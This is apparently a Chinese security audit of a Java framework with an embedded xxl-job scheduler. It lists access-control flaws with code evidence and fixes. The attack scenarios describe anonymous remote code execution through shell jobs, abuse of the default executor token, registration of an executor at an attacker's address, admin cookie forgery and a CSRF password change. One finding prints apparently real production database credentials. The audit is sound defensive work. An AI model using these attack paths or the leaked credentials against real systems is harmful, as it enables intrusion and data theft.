# kdla 鉴权与访问控制专项审计报告（B-auth）

- 审计对象：`top.kdla.framework:kdla-components`，分支 `2.0.0-SNAPSHOT`（JDK 21 / Spring Boot 3.4.0）
- 审计范围：OWASP A01 Broken Access Control / A07 Authentication Failures
- 审计方式：只读源码审计（未改任何源码/pom，未跑 mvn，未做 git 操作）
- 审计日期：2026-11-24
- 重点模块：`kdla-component-supplement-trdplatformcloud`、`kdla-component-supplement-job-application`（内嵌 xxl-job-admin，真实应用）、`kdla-component-supplement-job`、`kdla-component-exception`

## 严重度计数

| 严重度 | 数量 | 编号 |
|---|---|---|
| Critical | 2 | B-01, B-03 |
| High | 4 | B-02, B-04, B-05, B-06 |
| Medium | 4 | B-07, B-08, B-09, B-10 |
| Low | 2 | B-11, B-12 |

---

## B-01 [Critical] xxl-job-admin 任务管理 8 个端点匿名开放（limit=false），可匿名创建 GLUE 任务并触发 → 执行器 RCE

**位置**：`kdla-component-supplement-job-application/src/main/java/com/xxl/job/admin/controller/JobInfoController.java:100-160`

**证据**（真实代码）：

```java
// JobInfoController.java:110-115
@RequestMapping("/add")
@ResponseBody
@PermissionLimit(limit = false)
public ReturnT<String> add(XxlJobInfo jobInfo) {
    return xxlJobService.add(jobInfo);
}

// JobInfoController.java:145-157
@RequestMapping("/trigger")
@ResponseBody
@PermissionLimit(limit = false)
//@PermissionLimit(limit = false)
public ReturnT<String> triggerJob(int id, String executorParam, String addressList) {
    if (executorParam == null) { executorParam = ""; }
    JobTriggerPoolHelper.trigger(id, TriggerTypeEnum.MANUAL, -1, null, executorParam, addressList);
    return ReturnT.SUCCESS;
}
```

`/jobinfo/pageList`(:102)、`/add`(:112)、`/update`(:119)、`/remove`(:126)、`/stop`(:133)、`/start`(:140)、`/trigger`(:147)、`/nextTriggerTime`(:160) 全部 `@PermissionLimit(limit = false)`。拦截器据此直接放行：

```java
// PermissionInterceptor.java:34-41
boolean needLogin = true;
...
PermissionLimit permission = method.getMethodAnnotation(PermissionLimit.class);
if (permission!=null) {
    needLogin = permission.limit();   // false → 跳过登录校验
    needAdminuser = permission.adminuser();
}
```

且服务层无任何授权补偿——`XxlJobServiceImpl.add`（`service/impl/XxlJobServiceImpl.java:61-157`）只做字段合法性校验，接受 `glueSource` 直接入库（:106-108 处理 GLUE_SHELL 源码、:151 `xxlJobInfoDao.save(jobInfo)`），全文件无 `validPermission` 调用。上游 xxl-job 这些端点均要求登录且控制器内调用 `validPermission(request, jobGroup)`，本仓库两处都被去掉，属**本地修改**（:148 被注释的重复注解是编辑痕迹）。

**根因**（框架自身调用链不带鉴权）：

```java
// kdla-component-supplement-job/.../timer/manager/impl/IotXxlJobManager.java:50-53
String url = xxlJobConfig.getAdminAddresses() + XxlJobUrlConstants.ADD_JOB;  // "/jobinfo/add"
CompletableFuture<JSONObject> futureRes = vertxHttpClient.sendRequest(HttpMethod.POST, url, null, xxlJobInfo, JSONObject.class);
```

`IotXxlJobManager` 调 admin 的 `/jobinfo/add|remove|start|stop|pageList`（`XxlJobUrlConstants.java:5-12`）不带任何 Cookie/accessToken。为了让框架自己的 manager 能跑通，admin 侧把登录要求关掉了。

**攻击场景**：攻击者可达 admin（默认 `server.port=8080`，context-path `/xxl-job-admin`，见 `application.properties:2-3`）即可：
1. `POST /xxl-job-admin/jobinfo/pageList?jobGroup=1&triggerStatus=-1` 枚举执行器组与任务（jobGroup 可 1..N 爆破）；
2. `POST /xxl-job-admin/jobinfo/add`，`glueType=GLUE_SHELL`、`glueSource=<反弹shell/任意命令>`、`jobGroup=<已存在组>`、`scheduleType=CRON`；
3. `POST /xxl-job-admin/jobinfo/trigger?id=<新任务id>` → 合法执行器拉取并执行攻击者脚本（执行侧证据见 B-03 的 `ExecutorBizImpl.run`）→ **执行器主机 RCE**。
4. 旁路危害：`/remove`、`/stop` 匿名删除/停掉全部生产任务（DoS）；`/trigger` 的 `addressList` 参数可把触发请求（含 glueSource、任务参数）重定向到攻击者控制的地址（参数窃取 + SSRF）。

**exploitability**：真实应用、无网关代码、端点匿名、利用链完整（add→trigger→GLUE 执行）。只要 admin 端口对攻击者可达即成立。框架库上下文不豁免——本模块是内嵌真实应用，不是 provided 依赖。

**修复方案**：恢复 `/jobinfo/*` 登录要求（去掉 `limit=false`），同时在 `IotXxlJobManager` 侧补鉴权（走 accessToken 的机器接口或登录态），两侧同仓同步改；`add/update/remove/start/stop/trigger` 内补 `validPermission`。过渡期至少用网络策略把 admin 限制在内网/跳板。

**破坏性分类**：**破坏性**（改鉴权强制行为；单独恢复登录会打断 `IotXxlJobManager` 及依赖匿名接口的下游调用，必须与 manager 鉴权改造联动裁定）。

---

## B-03 [Critical] 执行器 accessToken 默认 `default_token`（公开已知值），EmbedServer `/run` 可被直接投递 GLUE 代码 → 下游应用 RCE

**位置**：
- `kdla-component-supplement-job/src/main/java/top/kdla/framework/supplement/timer/config/XxlJobConfig.java:22-23`
- `kdla-component-supplement-job/src/main/java/com/xxl/job/core/server/EmbedServer.java:177-181,191-193`
- `kdla-component-supplement-job/src/main/java/com/xxl/job/core/biz/impl/ExecutorBizImpl.java:77-116`

**证据**：

```java
// XxlJobConfig.java:22-23
@Value("${xxl.job.accessToken:default_token}")
private String accessToken;
```

```java
// EmbedServer.java:177-181（EmbedHttpServerHandler.process）
if (accessToken != null
        && accessToken.trim().length() > 0
        && !accessToken.equals(accessTokenReq)) {
    return new ReturnT<String>(ReturnT.FAIL_CODE, "The access token is wrong.");
}
// :191-193
case "/run":
    TriggerParam triggerParam = GsonTool.fromJson(requestData, TriggerParam.class);
    return executorBiz.run(triggerParam);
```

```java
// ExecutorBizImpl.java:93（GLUE_GROOVY 分支）
IJobHandler originJobHandler = GlueFactory.getInstance().loadNewInstance(triggerParam.getGlueSource());
// :115（脚本分支）
jobHandler = new ScriptJobHandler(triggerParam.getJobId(), triggerParam.getGlueUpdatetime(), triggerParam.getGlueSource(), ...);
```

`default_token` 是上游 xxl-job 的公开默认值，且明文写在本仓库 `kdla-component-supplement-job-application/src/main/resources/application.properties:60`（admin 侧同值）。执行器 Netty 端口默认 9999（`XxlJobConfig.java:34-35`），绑定所有网卡（`EmbedServer.java:80` `bootstrap.bind(port)`）。

**攻击场景**：下游应用引入本框架并启用执行器、未覆盖 `xxl.job.accessToken` 时，攻击者直连执行器 `POST http://<host>:9999/run`，头 `XXL-JOB-ACCESS-TOKEN: default_token`（头名见 `XxlJobRemotingUtil.java:21`），body 为 `TriggerParam{glueType:"GLUE_SHELL", glueSource:"<任意命令>", jobId:...}` → 命令在下游应用进程内执行。无需经过 admin，无需登录。这是 xxl-job 生态已被公开利用的 default_token RCE 路径。

**exploitability**：条件性成立——执行器 Bean 受 D2 错配键守卫（见 B-11，需 `xxl.enabled.xxl=true` 才启动）；一旦启动且 token 未覆盖，利用为零交互。框架把公开已知值作为默认密钥属于 (a) 框架真实漏洞，不是下游预期覆盖项：默认值本身即不安全。

**修复方案**：默认值改为空且空值 fail-closed（拒绝启动或拒绝所有请求并告警），或强制要求显式配置随机 token；`EmbedServer.process` 的空 token 放行分支（:177-179）改为拒绝。与 admin 侧 token 策略（B-02）统一。

**破坏性分类**：**破坏性**（改默认口令/密钥与鉴权强制行为；未配置 token 的下游执行器会拒绝服务，需随版本公告强制配置）。

---

## B-02 [High] admin `/api/{uri}` accessToken 空值 fail-open + 默认 `default_token`，注册/回调接口可被伪造

**位置**：
- `kdla-component-supplement-job-application/src/main/java/com/xxl/job/admin/controller/JobApiController.java:38-54`
- `kdla-component-supplement-job-application/src/main/resources/application.properties:60`

**证据**：

```java
// JobApiController.java:38-54
@RequestMapping("/{uri}")
@ResponseBody
@PermissionLimit(limit=false)
public ReturnT<String> api(HttpServletRequest request, @PathVariable("uri") String uri, @RequestBody(required = false) String data) {
    ...
    if (XxlJobAdminConfig.getAdminConfig().getAccessToken()!=null
            && XxlJobAdminConfig.getAdminConfig().getAccessToken().trim().length()>0
            && !XxlJobAdminConfig.getAdminConfig().getAccessToken().equals(request.getHeader(XxlJobRemotingUtil.XXL_JOB_ACCESS_TOKEN))) {
        return new ReturnT<String>(ReturnT.FAIL_CODE, "The access token is wrong.");
    }
    // services mapping: callback / registry / registryRemove
```

```properties
# application.properties:60
xxl.job.accessToken=default_token
```

两层问题：
1. **fail-open**：accessToken 为 null/空白时整个校验跳过，`/api/callback`、`/api/registry`、`/api/registryRemove` 完全匿名（下游把 token 配空即触发）。
2. **默认值公开**：现配置 `default_token` 非空，校验"生效"，但值人人可知，等价于无鉴权。

**攻击场景**：
- `POST /xxl-job-admin/api/registry`（头 `XXL-JOB-ACCESS-TOKEN: default_token`，body `RegistryParam{registryGroup:"EXECUTOR", registryKey:"<已有appname>", registryValue:"http://攻击者IP:9999"}`）→ 恶意执行器混入执行器组地址列表（`AdminBizImpl.java:26-28` → `JobRegistryHelper.registry`），后续任务被路由到攻击者机器，任务参数/凭据被窃取，攻击者还可回传伪造执行结果；
- `registryRemove` 摘除合法执行器注册 → 调度 DoS；
- `callback` 伪造任务完成/失败状态，污染告警与重试逻辑。

**exploitability**：admin 可达即成立；token 为空时零门槛，`default_token` 时仅多一个公开常量。属 (a) 真实漏洞（fail-open 逻辑）+ (b) 不安全默认（default_token）叠加。

**修复方案**：空 token 一律拒绝（fail-closed）；废弃 `default_token`，部署时强制随机值；执行器/admin 两侧 token 一致性校验保留。

**破坏性分类**：**破坏性**（改鉴权强制行为与默认密钥；依赖空 token 或默认 token 的下游执行器注册会立即失败，需联动配置下发）。

---

## B-04 [High] E-04 核实成立：trd 5 控制器 + 4 VO 的 blade-auth 守卫 `required=false` + `isNotEmpty`，省略头即匿名写；叠加 Groovy 解析代码可成 RCE 链；detail 匿名泄露 appSecret

**位置**（守卫模式，全部核实）：
- `kdla-component-supplement-trdplatformcloud/.../controller/TrdPlatformAPIController.java:57,71-75,81,87-90`（save/update 内联守卫）；`:96-98` delete 无任何鉴权参数
- `.../controller/TrdPlatformInfoController.java:101,113`（save/update），`:119` delete 无鉴权，`:50-56` detail 无鉴权
- `.../controller/TrdPlatformTaskController.java:92,104`，`:110` delete 无鉴权
- `.../controller/TrdPlatformMeasureRefController.java:51,61`，`:73` delete 无鉴权
- `.../controller/TrdPlatformModelRefController.java:70,85`，`:102` delete 无鉴权
- VO 守卫：`vo/TrdPlatformInfoAddVo.java:79-83,98-101`、`vo/TrdPlatformTaskAddVo.java:56-60,71-74`、`vo/TrdPlatformMeasureRefAddVo.java:69-73,84-87`、`vo/TrdPlatformModelRefAddVo.java:78-82,93-96`

**证据**（典型两处）：

```java
// TrdPlatformAPIController.java:57,71-76
public SingleResponse<?> save(@Valid @RequestBody TrdPlatformApiAddVo trdPlatformApiAddVo,
        @RequestHeader(value = "blade-auth", required = false) String bladeAuth) {
    ...
    if (StringUtils.isNotEmpty(bladeAuth)) {
        String account = JwtUtil.getInfoFromToken(bladeAuth, "account");
        trdPlatformApiBo.setCreateUser(account);
        trdPlatformApiBo.setUpdateUser(account);
    }
    return SingleResponse.buildSuccess(trdPlatformApiService.saveApi(trdPlatformApiBo));
}
```

```java
// TrdPlatformInfoAddVo.java:79-83
if (StringUtils.isNotEmpty(bladeAuth)) {
    String account = JwtUtil.getInfoFromToken(bladeAuth, "account");
    entity.setCreateUser(account);
    entity.setUpdateUser(account);
}
```

blade-auth 头只用于"填 createUser/updateUser"，**不是准入条件**：省略头 → 跳过验签 → 写操作照常落库。所有 GET（detail/page/list）与 DELETE 连守卫都没有。trd 模块内无任何 Filter/Interceptor/SecurityFilterChain（全模块 grep 无命中），控制器经下游组件扫描激活后即是裸端点。

**升级链 1（RCE）**：匿名 `POST /trd/platform/api/save` 可写入 `bodyAnalysisType=GROOVY` + 任意 `bodyAnalysisCode`（控制器 :64-66 只查非空，不查内容），任务执行时：

```java
// server/TrdPlatformCloudServerImpl.java:269-271
if (apiBo.getBodyAnalysisType() == TrdPlatformEnum.BodyParsingMethodEnum.GROOVY.getCode()) {
    Object auth = groovyShellCal(apiBo.getBodyAnalysisCode(), obj);
// :511-523
public static Object groovyShellCal(String groovyCode, Map<String, Object> bodyre) {
    Binding binding = new Binding();
    GroovyShell shell = new GroovyShell(binding);
    ...
    Object res = shell.evaluate(groovyCode);
```

匿名写入的 Groovy 代码在下游应用进程内 `shell.evaluate` 执行 → RCE。

**升级链 2（凭据泄露）**：`GET /trd/platform/detail/{id}` 匿名返回 `configJson`（`TrdPlatformInfoVo.java:52`），内容含三方平台 `appKey/appSecret`（`TrdPlatformInfoAddVo.java:51-55` 的 schema 说明）。

**exploitability**：1.x 既有设计，预期由 BladeX 网关统一鉴权收敛（(b) 类不安全默认）。但框架未提供任何 fail-closed 开关或文档强制约束，下游一旦直连暴露（内网横向、网关漏配路由）即匿名 CRUD + RCE。JWT 验签本身 fail-closed（见 B-12 核实），漏洞在"验签可选"。

**修复方案**：框架层提供强制模式（如 `kdla.trd.auth.required=true` 时缺头/验签失败一律 401），默认值裁定后逐步切 fail-closed；`bodyAnalysisCode` 的 Groovy 执行加沙箱或白名单；detail 返回脱敏 configJson。

**破坏性分类**：**破坏性**（强制 blade-auth 会使无网关/无 token 的下游调用方立即 401；1.x 既有行为变更需版本公告与下游排查）。

---

## B-05 [High] 生产数据库账号口令硬编码入库（application.properties），且 JDBC 明文传输

**位置**：`kdla-component-supplement-job-application/src/main/resources/application.properties:26-32`

**证据**：

```properties
db.url=10.39.68.62:3306/xxl_job_13
db.username=adm_airecon
db.password=adm2o3rhU$2i

spring.datasource.url=jdbc:mysql://10.39.68.62:3306/xxl_job_13?sslMode=disabled&autoReconnect=true&useUnicode=true&characterEncoding=utf-8&allowMultiQueries=true
spring.datasource.username=adm_airecon
spring.datasource.password=adm2o3rhU$2i
```

**攻击场景**：任何能读本仓库的人（下游依赖方、CI 缓存、镜像层——jar 内打包该 properties）直接获得生产库 `xxl_job_13` 的读写凭据。xxl_job 库含用户表（口令 MD5）、任务表（glueSource 可含业务凭据）、执行器注册表。拿到 DB 写权限后可直接改 `xxl_job_user` 口令或插入管理员，绕过全部 Web 鉴权；`sslMode=disabled` 使内网嗅探可截获凭据。

**exploitability**：凭据已泄露于源码，成立与否取决于该库账号当前是否有效（需 DBA 核实，本地不连库）。内网地址不降低严重度——仓库分发范围即攻击面。

**修复方案**：立即轮换该账号口令；配置改为环境变量/配置中心注入（`spring.datasource.password=${DB_PASSWORD}`）；清理 git 历史中的明文（需裁定）；JDBC 启用 TLS。

**破坏性分类**：口令轮换本身为非破坏性运维动作；**配置外部化属破坏性**（改变部署方式，需 DevOps 配合注入，否则应用起不来）。

---

## B-06 [High] 会话令牌 = hex(JSON(用户对象))：无签名、无过期、内嵌口令 MD5；知道哈希即可伪造管理员 Cookie；Cookie 无 Secure/SameSite，"记住我"约 68 年

**位置**：
- `kdla-component-supplement-job-application/src/main/java/com/xxl/job/admin/service/LoginService.java:30-42,62-65,86-105`
- `kdla-component-supplement-job-application/src/main/java/com/xxl/job/admin/core/util/CookieUtil.java:15,27-30,40-49`

**证据**：

```java
// LoginService.java:30-34
private String makeToken(XxlJobUser xxlJobUser){
    String tokenJson = JacksonUtil.writeValueAsString(xxlJobUser);   // 含 password(MD5)
    String tokenHex = new BigInteger(tokenJson.getBytes(StandardCharsets.UTF_8)).toString(16);
    return tokenHex;
}
// :96-99（ifLogin 核心判定）
XxlJobUser dbUser = xxlJobUserDao.loadByUserName(cookieUser.getUsername());
if (dbUser != null) {
    if (cookieUser.getPassword().equals(dbUser.getPassword())) {
        return dbUser;
```

```java
// CookieUtil.java:15,28-29
private static final int COOKIE_MAX_AGE = Integer.MAX_VALUE;   // ≈68 年
int age = ifRemember?COOKIE_MAX_AGE:-1;
set(response, key, value, null, COOKIE_PATH, age, true);       // 仅 HttpOnly，无 Secure/SameSite
```

令牌就是用户 JSON（`XxlJobUser` 含 id/username/password/role/permission，`core/model/XxlJobUser.java:10-14`）的十六进制，服务端只比对 username+MD5，**无签名、无服务端过期、无吊销**（改密前永久有效）。

**攻击场景**：
1. **离线伪造**：若 admin 口令为默认 `123456`（见 B-08），其 MD5 `e10adc3949ba59abbe56e057f20f883e` 公开已知。攻击者无需登录，直接构造 Cookie `XXL_JOB_LOGIN_IDENTITY=hex({"username":"admin","password":"e10adc3949ba59abbe56e057f20f883e"})` 即通过 `ifLogin`（role 以 DB 为准，伪造者连 role 都不用猜）。
2. **哈希即凭据**：Cookie 一旦经日志/代理/HTTP 明文（无 Secure）泄露，攻击者获得口令 MD5，可离线爆破或直接重放 impersonation，无需知道明文。
3. 无 SameSite + 状态变更端点接受 GET → CSRF（见 B-09）。

**exploitability**：上游 xxl-job 既有设计，本仓库原样继承。伪造路径依赖 B-08 默认口令或哈希泄露；令牌结构缺陷本身无条件成立。

**修复方案**：改为服务端签名的随机 session id（或 HMAC 签名 + 过期时间的令牌），令牌不含口令哈希；Cookie 加 `Secure`、`SameSite=Lax`；"记住我"设合理上限并支持服务端吊销。

**破坏性分类**：**破坏性**（改登录流程/令牌格式，全部存量会话失效；Secure 要求 HTTPS 部署，HTTP 环境登录会坏）。

---

## B-07 [Medium] 口令无盐 MD5 存储、最短 4 位、改密不验旧口令、登录无限速/锁定

**位置**：
- `LoginService.java:57-58`（登录比对）、`UserController.java:97,128,167`（建/改用户 MD5）、`UserController.java:153-178`（updatePwd）、`UserController.java:93-94,124,162`（长度 4-20）

**证据**：

```java
// LoginService.java:57-58
String passwordMd5 = DigestUtils.md5DigestAsHex(password.getBytes(StandardCharsets.UTF_8));
if (!passwordMd5.equals(xxlJobUser.getPassword())) { ... }
// UserController.java:162（updatePwd 唯一强度约束）
if (!(password.length()>=4 && password.length()<=20)) { ... }
```

`updatePwd`（:153-178）不要求旧口令；`LoginService.login` 全函数无失败计数/限速/锁定。

**攻击场景**：DB 或 Cookie 泄露后 MD5 可秒级彩虹表还原（配合 B-05 的 DB 凭据泄露形成链）；4 位口令可在线暴力破解（无限速）；CSRF 改密（B-09）不需要旧口令即可接管账号。

**exploitability**：需先有泄露面或在线爆破条件；上游既有设计。属 (a)+(b) 混合：框架应用自身的不安全实现。

**修复方案**：迁移 bcrypt/argon2（带盐）；最短长度 ≥8 并查弱口令字典；updatePwd 验旧口令；登录加限速与失败锁定。

**破坏性分类**：**破坏性**（改口令存储与登录流程，需存量 MD5 迁移方案；改密交互变化影响下游用户）。

---

## B-08 [Medium] 默认管理员 admin/123456 —— 仓库内无法证实，需对生产库核实（上游 xxl-job 初始化脚本默认值）

**位置**：仓库无初始化 SQL（全仓 `find *.sql` 无命中）；用户表在外部库 `xxl_job_13@10.39.68.62`（`application.properties:26`）。登录逻辑 `LoginService.java:53-60` 直接比对 DB 中 MD5，代码层无默认口令、无首登强制改密。

**证据**（代码侧无内置口令，判定依赖 DB 现状）：

```java
// LoginService.java:53-58
XxlJobUser xxlJobUser = xxlJobUserDao.loadByUserName(username);
if (xxlJobUser == null) { return ...; }
String passwordMd5 = DigestUtils.md5DigestAsHex(password.getBytes(StandardCharsets.UTF_8));
if (!passwordMd5.equals(xxlJobUser.getPassword())) { return ...; }
```

上游 xxl-job 的 `tables_xxl_job.sql` 默认插入 `admin / e10adc3949ba59abbe56e057f20f883e`（MD5("123456")）。若该库沿用上游初始化脚本且未改密，则 B-06 的 Cookie 伪造零成本成立，严重度应升为 High/Critical。

**核实 SQL**（本地不连库，交用户在真实库执行）：

```sql
-- [生产] xxl_job_13@10.39.68.62:3306
SELECT id, username, password, role FROM xxl_job_user;
-- password = 'e10adc3949ba59abbe56e057f20f883e' 即默认口令 123456 未改
```

**修复方案**：核实后立即改密（强口令）；部署流程加首登强制改密；初始化脚本不再使用公开默认哈希。

**破坏性分类**：改密为运维动作（非破坏性代码变更）；首登强制改密属**破坏性**（改登录流程）。当前按"待核实"计 Medium。

---

## B-09 [Medium] 状态变更端点接受 GET + Cookie 鉴权无 CSRF 防护 → 跨站请求伪造（可链式接管账号）

**位置**：`UserController.java:75-78`（/user/add）、`:153-155`（/user/updatePwd）、`JobInfoController.java:110-157`、`JobGroupController.java:63,107,176` 等——全部 `@RequestMapping` 未限定 method；`WebMvcConfig.java:22-26` 仅注册登录/Cookie 拦截器，无 CSRF 机制；Cookie 无 SameSite（B-06）。

**证据**：

```java
// UserController.java:153-155（未限定 POST，无 CSRF token，无旧口令校验）
@RequestMapping("/updatePwd")
@ResponseBody
public ReturnT<String> updatePwd(HttpServletRequest request, String password){
```

**攻击场景**：诱导已登录管理员访问恶意页面，`<img src="http://<admin>/xxl-job-admin/user/updatePwd?password=attacker123">` → 管理员口令被改为攻击者已知值（updatePwd 不验旧口令，B-07）→ 攻击者正常登录接管。同理 `/user/add` 可 CSRF 植入管理员账号。登录端点本身限 POST（`IndexController.java:64`），但其余状态变更端点均不限。

**exploitability**：需要受害者浏览器携带有效会话访问攻击者页面；内网 admin + 无 SameSite 使成立门槛低。上游既有缺陷。

**修复方案**：状态变更端点限定 POST；引入 CSRF token 或至少 SameSite=Lax/Strict；敏感操作（改密/建管理员）二次验证。

**破坏性分类**：**破坏性**（改请求方法约束与登录态交互，GET 调用方/前端表单需同步改）。

---

## B-10 [Medium] `/jobcode/save` 缺 validPermission：任意低权限登录用户可改写任意任务的 GLUE 源码 → 横向越权 + 执行器 RCE

**位置**：`kdla-component-supplement-job-application/src/main/java/com/xxl/job/admin/controller/JobCodeController.java:56-94`

**证据**：

```java
// JobCodeController.java:56-58（无 @PermissionLimit(adminuser)，默认仅需登录；方法体内无 validPermission）
@RequestMapping("/save")
@ResponseBody
public ReturnT<String> save(Model model, int id, String glueSource, String glueRemark) {
// :72-77 直接覆盖任意 jobId 的源码
exists_jobInfo.setGlueSource(glueSource);
...
xxlJobInfoDao.update(exists_jobInfo);
```

对比同文件 index 有授权（:46 `JobInfoController.validPermission(request, jobInfo.getJobGroup())`），save 没有。`XxlJobUser.validPermission`（`core/model/XxlJobUser.java:57-71`）的执行器组级授权在 save 路径完全失效。

**攻击场景**：role=0、仅授权组 A 的用户，调 `/jobcode/save?id=<组B任务>&glueSource=<恶意代码>` 改写组 B 的 GLUE 任务，下次调度在组 B 执行器上执行 → 越权 + RCE。

**exploitability**：需任一有效低权限会话；多租户/多执行器组场景成立。上游 xxl-job 同样缺陷，本仓库继承。注意 B-01 未修复时本条被匿名路径覆盖，修复 B-01 后本条独立暴露。

**修复方案**：save 内补 `JobInfoController.validPermission(request, exists_jobInfo.getJobGroup())`（先 load 后校验）。

**破坏性分类**：**破坏性**（收紧授权强制行为，原越权调用方会 403；属安全修复但按定义需裁定发布节奏）。

---

## B-11 [Low] D2 核实成立：`@ConditionalOnProperty(prefix="xxl.enabled", name="xxl")` 实际生效键为 `xxl.enabled.xxl`，守卫方向为 fail-closed（功能失效，非鉴权绕过）

**位置**：
- `kdla-component-supplement-job/src/main/java/top/kdla/framework/supplement/timer/config/XxlJobConfig.java:51-53`
- `kdla-component-supplement-job/src/main/java/top/kdla/framework/supplement/timer/manager/impl/IotXxlJobManager.java:23`

**证据**：

```java
// XxlJobConfig.java:51-53
@Bean
@ConditionalOnProperty(prefix = "xxl.enabled", name = "xxl", havingValue = "true")
public IotXxlJobSpringExecutor xxlJobExecutor() {
// IotXxlJobManager.java:23
@ConditionalOnProperty(prefix = "xxl.enabled", name = "xxl", havingValue = "true")
```

Spring 拼接规则 `prefix + "." + name` → 生效键 **`xxl.enabled.xxl`**（`matchIfMissing` 默认 false）。下游按直觉配 `xxl.enabled=true` 时执行器与 manager 都**不启动**。

**安全判定**：守卫失效方向是"该开的没开"（fail-closed），不产生未授权访问；影响是任务静默不执行的可用性/配置事故，并间接缩小 B-03 攻击面（执行器没起）。前序"not measured"现以代码确认。

**修复方案**：与下游约定真实键名；若意图是 `xxl.enabled`，改 `prefix="xxl", name="enabled"` 并全量排查下游配置。

**破坏性分类**：**破坏性**（改激活键会使原配 `xxl.enabled=true` 的下游突然启动执行器/manager，行为突变需裁定；维持现状则仅补文档，文档为非破坏性）。

---

## B-12 [Low] JwtUtil fail-closed 核实成立（前序结论可信），残留三点：无 exp 的 token 永久有效、验签失败返回 HTTP 200、不校验 Bearer 前缀

**位置**：`kdla-component-supplement-trdplatformcloud/src/main/java/top/kdla/framework/supplement/trdcloud/utils/JwtUtil.java:31-78`

**核实结论**（亲自读码，hutool 5.8.36，根 pom:75）：
- 缺钥/空白钥/容器未注入：`requireSignKey()`(:57-67) 抛 BizException —— 拒。
- 空 token/畸形头：`extractToken()`(:69-78) null、`parts.length<2`、`parts[1].isEmpty()` 均抛 —— 拒。
- alg=none/错钥/篡改：`setSigner(JWTSignerUtil.hs256(...))`(:37) 显式固定 HS256 签名器，`jwt.verify()`(:42) 用该签名器验签，不信任 header alg —— none 算法签名必不匹配，拒。
- 过期：`jwt.validate(0)`(:46) 零容忍 —— 拒。
- 回归测试 `JwtUtilTest.java:51-103` 覆盖篡改/错钥/过期/缺钥/null 容器/畸形头（alg=none 与空 token 无显式用例，但代码路径覆盖）。

**残留问题**：
1. `validate(0)` 对**缺失 exp 声明**的 token 跳过过期检查（hutool 语义：无 exp 即不过期）→ 无 exp 的合法签名 token 永久有效。BladeX 真实 token 带 exp，实际风险低。
2. 验签失败抛 `BizException`，经 `kdla-component-exception/.../UnifiedExceptionControllerAdvice.java:142-153` 处理**无 @ResponseStatus → HTTP 200** + 失败 body。请求确实被拒（非绕过），但依赖状态码的网关/监控看不到 401。
3. `extractToken` 不校验 `parts[0]=="Bearer"`，任意 scheme 前缀都接受（token 仍验签，无实际绕过）。

**修复方案**：强制要求 exp 声明存在；鉴权失败映射 401（专属异常或 advice 分支）；校验 Bearer 前缀；补 alg=none/空 token/无 exp 回归用例。

**破坏性分类**：补测试为**非破坏性**；强制 exp/改 401/校验前缀均**破坏性**（改拒绝行为与响应契约，下游状态码消费方需排查）。

---

## 已核实闭合 / 无发现项（不报噪声）

1. **PermissionInterceptor 默认 fail-closed**：`PermissionInterceptor.java:34` `needLogin=true` 默认拦截，未标注解的控制器方法（JobLogController、JobCodeController、JobGroupController、UserController 多数端点）均需登录；`handler !instanceof HandlerMethod` 放行仅影响静态资源（`WebMvcConfig` 静态路径 `/static/**`）。拦截器注册 `/**` 无漏配（`WebMvcConfig.java:24`）。
2. **SecurityAccessDeniedExceptionAdvice 正确**：`UnifiedExceptionControllerAdvice.java:76-98` 内层 advice 以 `@ConditionalOnClass(AccessDeniedException.class)` 守护，spring-security `AccessDeniedException→403`、`AuthenticationException→401`，不再误绑 nio/SASL 异常；条件注册有回归测试（`SecurityAccessDeniedAdviceConditionTest`）。无 fail-open。
3. **Cookie 解析无反序列化 gadget**：`JacksonUtil.java:24` 裸 `ObjectMapper`，未开 default typing，`parseToken` 目标类型固定 `XxlJobUser.class`，攻击者控制 Cookie 内容无法触发多态反序列化。
4. **actuator 暴露面**：`pom.xml:64-68` 引入 actuator，但 `application.properties` 未配 `management.endpoints.web.exposure.include`，Boot 3.4 默认仅 health 暴露，无 env/heapdump 泄露配置。
5. **登录无用户名枚举**：用户不存在与口令错误返回同一 i18n 消息（`LoginService.java:54-59`）。

## 附注（范围外，仅提示）

- `Dockerfile:1` `openjdk:8-jre-slim` 与 JDK 21 编译产物不兼容（镜像无法启动）——功能性问题，不属本次鉴权审计，另行处理。
- `application.properties:30` `allowMultiQueries=true` 放大潜在 SQL 注入危害——注入专项（非本次范围）跟进。

---

## 分组清单

### 非破坏性可直接修（不改鉴权强制行为/默认口令/登录流程）

| 项 | 动作 |
|---|---|
| B-12（测试部分） | JwtUtilTest 补 alg=none、空 token、无 exp 三个回归用例 |
| B-08（核实部分） | 用户在真实库执行上文 [生产] SQL 核实默认口令；核实后改密为运维动作 |
| B-05（轮换部分） | 轮换 `adm_airecon` 口令（运维动作，不动代码） |
| B-11（文档部分） | 在 README/AGENTS 记载真实生效键 `xxl.enabled.xxl`，警示 D2 |
| 各条文档警示 | 发布说明中列明 default_token、blade-auth 可选守卫的风险与下游收敛要求 |

### 破坏性需裁定（改鉴权强制行为/默认口令/登录流程，影响下游）

| 项 | 动作 | 联动影响 |
|---|---|---|
| B-01 | 恢复 /jobinfo/* 登录 + validPermission | 必须同步给 IotXxlJobManager 加鉴权，否则框架自身定时任务注册断裂 |
| B-03 | 执行器默认 token 废弃/空值 fail-closed | 未配 token 的下游执行器拒服，需强制配置公告 |
| B-02 | admin /api 空 token fail-closed + 废弃 default_token | 与 B-03 同批，执行器注册链路需同步下发新 token |
| B-04 | trd blade-auth 强制模式（fail-closed 开关） | 无网关/无 token 的下游调用方 401；Groovy 沙箱另议 |
| B-05（外部化部分） | DB 凭据改环境变量/配置中心注入 | 需 DevOps 配合，否则应用无法启动 |
| B-06 | 签名令牌 + 过期 + Secure/SameSite | 存量会话全失效；HTTP 部署需先上 HTTPS |
| B-07 | bcrypt 迁移 + 口令策略 + 限速 | 存量 MD5 迁移方案；改密需验旧口令 |
| B-09 | 状态变更限 POST + CSRF 防护 | 前端/GET 调用方同步改造 |
| B-10 | /jobcode/save 补 validPermission | 越权调用方 403（安全收紧，按定义仍需裁定节奏） |
| B-11（改键部分） | 生效键改 xxl.enabled | 下游激活行为突变，需全量配置排查 |
| B-12（代码部分） | 强制 exp / 鉴权失败 401 / Bearer 校验 | 响应契约与拒绝行为变化 |